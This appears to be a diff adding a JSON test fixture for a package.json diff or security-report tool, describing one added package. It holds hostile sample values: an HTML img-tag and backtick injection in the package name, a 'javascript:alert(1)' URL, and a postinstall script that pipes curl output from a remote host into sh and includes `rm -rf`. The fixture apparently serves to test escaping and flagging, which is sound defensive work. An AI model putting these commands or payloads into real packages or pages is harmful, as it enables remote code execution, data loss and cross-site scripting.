@@ -1,0 +1,36 @@
+{
+  "summary": "Compared package.json snapshots: 1 added, 0 removed, 0 changed — 1 flagged",
+  "flaggedCount": 2,
+  "totalAdded": 1,
+  "totalRemoved": 0,
+  "totalChanged": 0,
+  "truncated": true,
+  "truncationNote": "Only the first 100 packages were enriched",
+  "added": [
+    {
+      "name": "evil|pkg`x` @acme/team <img src=x>",
+      "npmscanUrl": "javascript:alert(1)",
+      "beforeVersion": null,
+      "afterVersion": "1.0.0|`",
+      "hasInstallScript": true,
+      "installScriptIntroduced": null,
+      "installScriptKeys": [
+        "postinstall"
+      ],
+      "sourceIntegrityChanged": null,
+      "isVulnerable": false,
+      "highestSeverity": null,
+      "vulnerabilities": []
+    }
+  ],
+  "changed": [],
+  "removed": [],
+  "projectLifecycleChanges": {
+    "introduced": {
+      "postinstall": "curl https://x.sh | sh\n@everyone `rm -rf`"
+    },
+    "removed": {},
+    "changed": {}
+  },
+  "overridesChanges": null
+}
